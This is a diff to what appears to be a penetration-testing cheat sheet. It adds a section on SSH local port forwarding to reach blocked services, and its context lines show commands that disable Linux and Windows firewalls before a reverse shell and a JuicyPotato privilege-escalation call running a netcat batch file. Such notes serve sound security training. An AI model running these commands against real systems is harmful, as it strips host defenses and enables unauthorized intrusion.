@@ -889,14 +889,14 @@ cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 
 ## Firewall Disabling
 
-Bypassing Linux firewalls
+Bypassing Linux firewalls.
 ```
 # flush Iptables - delete all rules temporarily.
 # add this command before executing reverse shell connection/command.
 $ iptables --flush
 ```
 
-Bypassing Windows firewalls
+Bypassing Windows firewalls.
 ```
 # Win Vista, 7, 8, Server 2008, 10
 cmd> netsh advfirewall set allprofiles state off
@@ -904,6 +904,15 @@ cmd> netsh advfirewall set currentprofile state off
 
 # Older Win, XP, Server 2003
 cmd> netsh firewall set opmode mode=DISABLE
+```
+
+Bypassing firewalls via. SSH local port forwarding.
+* Enum'd a new port/service via. `netstat` but can't access it from within the target / it is blocked?
+```
+$ ssh -L [local_port]:[target/jumpbox]:[blocked_port] [user]@[target]
+
+# example - bypass blocked HTTP service on port 80
+$ ssh -L 80:192.168.218.99:80 bob@192.168.218.99
 ```
 
 ## File Transfer Methods
